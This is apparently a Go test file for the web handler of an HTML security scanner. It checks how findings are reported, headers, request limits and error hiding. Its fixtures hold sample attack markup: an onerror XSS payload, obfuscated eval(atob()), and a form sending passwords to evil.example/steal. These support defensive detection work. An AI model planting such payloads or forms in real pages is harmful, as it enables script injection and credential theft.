package web

import (
	"context"
	"encoding/json"
	"errors"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/suseong41/suseong-html-analyzer/fetcher"
)

// fakeFetch: 호출 여부를 기록하고 결과 반환
type fakeFetch struct {
	page   *fetcher.Page
	err    error
	called bool
	ctxErr error
}

func (f *fakeFetch) get(ctx context.Context, rawURL string) (*fetcher.Page, error) {
	f.called = true
	f.ctxErr = ctx.Err()
	return f.page, f.err
}

func scanRequestFor(target string) string {
	b, _ := json.Marshal(scanRequest{URL: target})
	return string(b)
}

func postScan(h http.Handler, body string) *httptest.ResponseRecorder {
	req := httptest.NewRequest(http.MethodPost, "/api/scan", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

func decode(t *testing.T, rec *httptest.ResponseRecorder) scanResponse {
	t.Helper()
	var out scanResponse
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("JSON 이 아니다: %v -- %q", err, rec.Body.String())
	}
	return out
}

func TestScanReturnsFindingsJSON(t *testing.T) {
	ff := &fakeFetch{page: &fetcher.Page{
		URL:  "https://attacker.example/",
		Body: []byte(`<img src=x onerror=alert(1)><script>eval(atob("x"))</script>`),
	}}
	rec := postScan(newHandler(ff.get), scanRequestFor("https://attacker.example/"))
	if rec.Code != http.StatusOK {
		t.Fatalf("상태 %d — 원하는 값: 200", rec.Code)
	}
	if ct := rec.Header().Get("Content-Type"); ct != "application/json; charset=utf-8" {
		t.Errorf("Content-Type %q", ct)
	}
	out := decode(t, rec)

	var evidence string
	for _, f := range out.Findings {
		if f.Code == "inline-handler" {
			evidence = f.Evidence
		}
	}
	if evidence != "<img onerror=…>" {
		t.Errorf("증거가 원본이 아니다: %q", evidence)
	}
	if strings.Contains(rec.Body.String(), "<img") {
		t.Error("응답 본문에 날것의 <img 가 있다")
	}
}

func TestScanSortsBySeverity(t *testing.T) {
	ff := &fakeFetch{page: &fetcher.Page{
		URL: "https://bank.example/",
		Body: []byte(`<script>eval(atob("x"))</script>` +
			`<form action="https://evil.example/steal"><input type="password" name="pw"></form>`),
	}}
	out := decode(t, postScan(newHandler(ff.get), scanRequestFor("https://bank.example/")))
	if len(out.Findings) != 2 {
		t.Fatalf("발견이 %d건 — 표본이 잘못됐다", len(out.Findings))
	}
	want := []struct{ severity, code string }{
		{"HIGH", "cross-origin-password-form"},
		{"MEDIUM", "obfuscated-eval"},
	}
	for i, w := range want {
		if f := out.Findings[i]; f.Severity != w.severity || f.Code != w.code {
			t.Errorf("%d번째가 %s %s — 원하는 값: %s %s", i, f.Severity, f.Code, w.severity, w.code)
		}
	}
}

func TestScanPassesNotes(t *testing.T) {
	ff := &fakeFetch{page: &fetcher.Page{
		URL:  "https://spa.example/",
		Body: []byte(`<!doctype html><html><head><script src="/app.js"></script></head><body><div id="app"></div></body></html>`),
	}}
	out := decode(t, postScan(newHandler(ff.get), scanRequestFor("https://spa.example/")))
	if len(out.Notes) == 0 {
		t.Error("SPA 셸인데 참고가 비었다")
	}
}

func TestScanUsesFinalURL(t *testing.T) {
	const final = "https://evil.example/login"
	ff := &fakeFetch{page: &fetcher.Page{
		URL:  final,
		Body: []byte(`<form action="https://evil.example/steal"><input type="password" name="pw"></form>`),
	}}
	out := decode(t, postScan(newHandler(ff.get), scanRequestFor("https://bank.example/")))
	if out.URL != final {
		t.Errorf("url 이 %q — 원하는 값: %q", out.URL, final)
	}

	for _, f := range out.Findings {
		if f.Code == "cross-origin-password-form" {
			t.Error("요청 URL 로 출처를 판정했다")
		}
	}
}

func TestScanEmptyResultUsesArrays(t *testing.T) {
	ff := &fakeFetch{page: &fetcher.Page{URL: "https://ok.example/", Body: []byte("<p>hi</p>")}}
	body := postScan(newHandler(ff.get), scanRequestFor("https://ok.example/")).Body.String()
	for _, want := range []string{`"findings":[]`, `"notes":[]`} {
		if !strings.Contains(body, want) {
			t.Errorf("응답에 %s 가 없다: %s", want, body)
		}
	}
}

func TestSecurityHeaderOnEvertResponse(t *testing.T) {
	h := newHandler((&fakeFetch{err: errors.New("x")}).get)
	cases := []struct {
		name string
		req  *http.Request
	}{
		{"404", httptest.NewRequest(http.MethodGet, "/nope", nil)},
		{"405", httptest.NewRequest(http.MethodGet, "/api/scan", nil)},
		{"가져오기 실패", func() *http.Request {
			r := httptest.NewRequest(http.MethodPost, "/api/scan", strings.NewReader(scanRequestFor("https://x.example/")))
			r.Header.Set("Content-Type", "application/json")
			return r
		}()},
	}
	for _, c := range cases {
		rec := httptest.NewRecorder()
		h.ServeHTTP(rec, c.req)
		hd := rec.Header()
		for _, d := range []string{"default-src 'none'", "frame-ancestors 'none'"} {
			if !strings.Contains(hd.Get("Content-Security-Policy"), d) {
				t.Errorf("%s: CSP 에 %q 가 없다: %q", c.name, d, hd.Get("Content-Security-Policy"))
			}
		}
		if hd.Get("X-Content-Type-Options") != "nosniff" {
			t.Errorf("%s: nosniff 가 없다", c.name)
		}
	}
}

// 브라우저에서 보낸 <form>이 닿는지
func TestScanRequiresJSONContentType(t *testing.T) {
	for _, ct := range []string{"application/x-www-form-urlencoded", "text/plain", ""} {
		ff := &fakeFetch{}
		req := httptest.NewRequest(http.MethodPost, "/api/scan", strings.NewReader(scanRequestFor("https://x.example/")))
		if ct != "" {
			req.Header.Set("Content-Type", ct)
		}
		rec := httptest.NewRecorder()
		newHandler(ff.get).ServeHTTP(rec, req)
		if rec.Code != http.StatusUnsupportedMediaType {
			t.Errorf("%q: 상태 %d — 원하는 값: 415", ct, rec.Code)
		}
		if ff.called {
			t.Errorf("%q: 가져오기를 시도했다", ct)
		}
	}
}

func TestScanRejectsLongURL(t *testing.T) {
	ff := &fakeFetch{}
	long := "https://x.example/" + strings.Repeat("a", maxURLLen)
	rec := postScan(newHandler(ff.get), scanRequestFor(long))
	if rec.Code != http.StatusBadRequest {
		t.Errorf("상태 %d — 원하는 값: 400", rec.Code)
	}
	if ff.called {
		t.Error("상한을 넘은 URL 로 가져오기를 시도했다")
	}
}

// body 길이 검사
func TestScanRejectsLargeBody(t *testing.T) {
	ff := &fakeFetch{}
	body := `{"url":"https://x.example/","pad":"` + strings.Repeat("a", maxBodyBytes) + `"}`
	rec := postScan(newHandler(ff.get), body)
	if rec.Code != http.StatusRequestEntityTooLarge {
		t.Errorf("상태 %d — 원하는 값: 413", rec.Code)
	}
	if ff.called {
		t.Error("큰 본문을 받아들이고 가져오기를 시도했다")
	}
}

// 오류 상세가 응답에 있는지
func TestScanDoesNotLeakFetchError(t *testing.T) {
	ff := &fakeFetch{err: errors.New("intranet.corp(10.1.2.3) 로는 접속하지 않는다: 사설망")}
	rec := postScan(newHandler(ff.get), scanRequestFor("http://intranet.corp/"))
	if rec.Code != http.StatusBadGateway {
		t.Errorf("상태 %d — 원하는 값: 502", rec.Code)
	}
	for _, leak := range []string{"10.1.2.3", "사설망"} {
		if strings.Contains(rec.Body.String(), leak) {
			t.Errorf("응답에 %q 가 새어 나갔다: %q", leak, rec.Body.String())
		}
	}
}

func TestScanPassesRequestContext(t *testing.T) {
	ff := &fakeFetch{err: errors.New("x")}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	req := httptest.NewRequest(http.MethodPost, "/api/scan", strings.NewReader(scanRequestFor("https://x.example/"))).WithContext(ctx)
	req.Header.Set("Content-Type", "application/json")
	newHandler(ff.get).ServeHTTP(httptest.NewRecorder(), req)
	if !ff.called {
		t.Fatal("가져오기를 호출하지 않았다")
	}
	if ff.ctxErr == nil {
		t.Error("요청의 context 가 전달되지 않았다")
	}
}
